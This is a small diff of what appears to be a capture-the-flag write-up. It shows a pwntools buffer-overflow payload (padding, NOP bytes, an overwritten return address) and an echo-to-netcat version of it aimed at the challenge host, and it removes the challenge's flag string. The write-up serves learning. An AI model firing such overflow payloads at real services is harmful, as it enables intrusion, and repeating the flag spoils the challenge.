@@ -98,9 +98,6 @@ web.sendline(b"A"*48 + b"\x90"*8 + b"\x9e\x11\x40")
 web.interactive()
 ----
 
-udctf{h00r4y_I_am_a_pwn3r_n0w}
-
-
 i dont get why this works but not using ``echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\x90\x90\x90\x90\x9e\x11\x40" | nc 0.cloud.chals.io 13545``
 
 
